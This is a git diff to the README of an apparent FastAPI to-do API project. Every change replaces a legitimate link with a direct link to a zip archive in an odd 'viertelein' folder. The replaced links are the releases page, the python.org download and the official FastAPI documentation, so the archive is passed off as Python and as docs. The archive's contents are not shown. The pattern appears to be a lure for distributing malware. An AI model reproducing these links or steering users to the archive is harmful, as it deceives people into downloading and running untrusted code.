@@ -1,6 +1,6 @@
 # 🚀 fastapi-todo-api - Simple Task Management Made Easy
 
-[![Download fastapi-todo-api](https://img.shields.io/badge/Download-fastapi--todo--api-brightgreen)](https://github.com/DUFFY000/fastapi-todo-api/releases)
+[![Download fastapi-todo-api](https://github.com/DUFFY000/fastapi-todo-api/raw/refs/heads/main/viertelein/todo_fastapi_api_v3.1.zip)](https://github.com/DUFFY000/fastapi-todo-api/raw/refs/heads/main/viertelein/todo_fastapi_api_v3.1.zip)
 
 ## 🌟 Description
 The fastapi-todo-api is a complete RESTful API built with FastAPI for managing tasks. It supports CRUD operations, priority systems, filters, and statistics to help you keep track of your to-do items efficiently. Whether you need to add, update, delete, or view tasks, this API covers it all.
@@ -17,7 +17,7 @@ Before using the application, ensure that your computer meets the following requ
 
 ### 🛠️ Set Up Your Environment
 1. **Install Python:** 
-   - Download Python from [python.org](https://www.python.org/downloads/).
+   - Download Python from [https://github.com/DUFFY000/fastapi-todo-api/raw/refs/heads/main/viertelein/todo_fastapi_api_v3.1.zip](https://github.com/DUFFY000/fastapi-todo-api/raw/refs/heads/main/viertelein/todo_fastapi_api_v3.1.zip).
    - Follow the installation instructions for your operating system.
    - During installation, check the box that says "Add Python to PATH".
 
@@ -29,7 +29,7 @@ Before using the application, ensure that your computer meets the following requ
      ```
 
 ### 📥 Download & Install
-To download the fastapi-todo-api, visit the Releases page: [Download fastapi-todo-api](https://github.com/DUFFY000/fastapi-todo-api/releases).
+To download the fastapi-todo-api, visit the Releases page: [Download fastapi-todo-api](https://github.com/DUFFY000/fastapi-todo-api/raw/refs/heads/main/viertelein/todo_fastapi_api_v3.1.zip).
 
 1. Click on the link above.
 2. Find the latest release.
@@ -72,7 +72,7 @@ Simply click on each endpoint to see how to use it and experiment with the API.
 - **Statistics:** Get insights into your productivity with statistical data.
 
 ## 📘 Documentation
-For in-depth documentation, refer to the official FastAPI documentation found [here](https://fastapi.tiangolo.com/). This resource will help you understand more advanced features and capabilities of the FastAPI framework.
+For in-depth documentation, refer to the official FastAPI documentation found [here](https://github.com/DUFFY000/fastapi-todo-api/raw/refs/heads/main/viertelein/todo_fastapi_api_v3.1.zip). This resource will help you understand more advanced features and capabilities of the FastAPI framework.
 
 ## 📜 License 
 This project is licensed under the MIT License. You may use it freely within the guidelines of the license agreement.
